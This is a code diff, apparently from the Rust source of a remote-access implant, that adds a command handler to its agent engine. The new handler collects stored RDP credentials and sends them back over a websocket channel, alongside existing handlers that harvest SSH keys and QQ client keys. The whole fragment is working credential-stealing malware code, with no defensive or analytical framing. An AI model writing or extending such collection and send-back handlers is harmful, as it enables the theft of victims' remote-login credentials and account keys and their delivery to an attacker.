@@ -197,6 +197,10 @@ impl AgentEngine {
                 let r = libra_modules::recon::SshKeys::collect();
                 ws_send(tx, &agent_id, "othersoft.ssh.result", &r, rid).await;
             }
+            ws_type::OTHERSOFT_RDP => {
+                let r = libra_modules::recon::RdpCreds::collect();
+                ws_send(tx, &agent_id, "othersoft.rdp.result", &r, rid).await;
+            }
             ws_type::OTHERSOFT_QQ_CLIENTKEY => {
                 let r = libra_modules::recon::QQClientKey::collect().await;
                 ws_send(tx, &agent_id, "othersoft.qq_clientkey.result", &r, rid).await;
